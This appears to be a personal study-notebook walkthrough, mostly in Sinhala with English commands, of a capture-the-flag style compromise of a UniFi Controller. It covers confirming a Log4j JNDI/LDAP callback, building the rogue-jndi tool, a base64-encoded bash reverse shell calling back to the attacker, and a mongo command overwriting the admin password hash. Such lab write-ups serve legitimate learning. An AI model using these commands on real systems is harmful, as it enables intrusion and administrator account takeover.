![[Pasted image 20260101225955.png]]


![[Pasted image 20260101230028.png]]


![[Pasted image 20260101230052.png]]


මෙය **HTTPS web interface එකක්** (UniFi Controller) — ඒක **port 8443** මත run වෙන්නේ.  
ඒ නිසා normal `http://IP` නෙවෙයි, **https + port** භාවිතා කළ යුතුයි.

### Website access කරන විදිහ (සරලව) 👇

#### 1️⃣ Browser එකෙන් access කරන්න

Kali / Host machine browser එක open කරලා:

`https://10.129.59.18:8443`

⚠️ **Certificate warning** එයි (self-signed certificate)  
→ **Advanced → Proceed** / **Accept Risk** කියලා continue කරන්න.

**“මට කොහොමද https + port භාවිතා කළ යුතුයි කියලා හිතෙන්නේ?”**  
එක **logic + clues** වලින් හඳුනාගන්න පුළුවන්.

---

## 1️⃣ Nmap service name බලන්න (මූලික clue එක) 🔍

ඔයාගේ output එකේ:

`8443/tcp open  ssl/nagios-nsca`

මෙතන **ssl/** කියන keyword එක තියෙනවා.

👉 **ssl / tls තියෙනවා = HTTPS**

> 🔑 Rule:  
> `ssl` / `https` / `tls` → **https://**



🔑 Rule:  
443, 8443, 9443 → usually **https**



![[Pasted image 20260101230150.png]]

quick Google search using the keywords "UniFi 6.4.54 exploit"
![[Pasted image 20260101232414.png]]


![[Pasted image 20260101233505.png]]



## Confirm Vulnerability (LDAP callback)

### 🛠 Tool: `tcpdump`

`sudo tcpdump -i tun0 port 389`

### Explain:

- `tun0` → VPN interface
    
- `389` → LDAP default port
    

👉 Burp → Send request

### Result:

- Target machine → **ඔයාගෙ machine එකට LDAP connect වෙනවා**
    

✔️ **VULNERABLE CONFIRMED**
![[Pasted image 20260102103905.png]]



change remember parameter :
![[Pasted image 20260102105058.png]]

- Log4j Vulnerability
then we can capture LDAP request from our terminal, confirm vulnerable
![[Pasted image 20260102105201.png]]


```

git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package


```

![[Pasted image 20260102122817.png]]
![[Pasted image 20260102123638.png]]


## Reverse Shell Payload Create

### 🛠 Tool: `base64`

`echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' | base64`

👉 Encoding reason:

- Special characters break නොවෙන්න

![[Pasted image 20260102123954.png]]


![[Pasted image 20260102164202.png]]


send 
![[Pasted image 20260102164233.png]]


![[Pasted image 20260102164138.png]]



![[Pasted image 20260102164754.png]]


find file
![[Pasted image 20260102165214.png]]


![[Pasted image 20260102165412.png]]


![[Pasted image 20260102170708.png]]


 ![[Pasted image 20260102170917.png]]


The $6 is the identifier for the hashing algorithm that is being used, which is SHA-512 in this case
![[Pasted image 20260102220118.png]]


```
mongo --port 27117 ace --eval 'db.admin.update({"_id":
ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$eBjXq0zlx/btuVaJ$ZmW1WjkxsJMtST7Otfxf2bFLzTwJxogawxvJjqrTfYtFh76.ErEf4Rg4z5FVm6GeWIcNFj43m.eIdKU3Nr7w8/"}})'

```
![[Pasted image 20260102220818.png]]



![[Pasted image 20260102221011.png]]



![[Pasted image 20260102221125.png]]


Done dashboard
![[Pasted image 20260102221900.png]]



![[Pasted image 20260102221948.png]]


![[Pasted image 20260102222226.png]]


![[Pasted image 20260102222341.png]]
